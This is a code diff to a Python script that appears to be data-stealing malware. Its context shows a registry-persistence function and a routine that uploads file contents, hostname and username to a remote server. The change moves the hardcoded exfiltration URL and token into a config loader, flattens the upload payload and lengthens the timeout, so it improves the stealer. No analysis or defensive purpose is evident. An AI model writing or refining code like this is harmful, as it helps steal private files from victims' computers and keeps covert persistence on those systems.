@@ -11,9 +11,11 @@ import shutil
 import subprocess
 from email.message import EmailMessage
 
-# Configuration
-SERVER_URL = "https://cvsstool-production.up.railway.app/send"
-API_TOKEN = "qutmess"
+from config_loader import load_app_config
+
+_cfg = load_app_config()
+SERVER_URL = _cfg["send_url"]
+API_TOKEN = _cfg["secret_token"]
 
 
 def add_registry_persistence():
@@ -86,12 +88,10 @@ def send_to_server(hostname, username, file_path):
                 "hostname": hostname,
                 "username": username,
                 "token": API_TOKEN,
-                "file": {
-                    "name": relative_path,
-                    "content": content
-                }
+                "filename": relative_path.replace("\\", "/"),
+                "content": content,
             },
-            timeout=10
+            timeout=30,
         )
         print(f"[+] Sent {file_path.name} - Status: {response.status_code}, Response: {response.text}")
         return response.status_code == 200
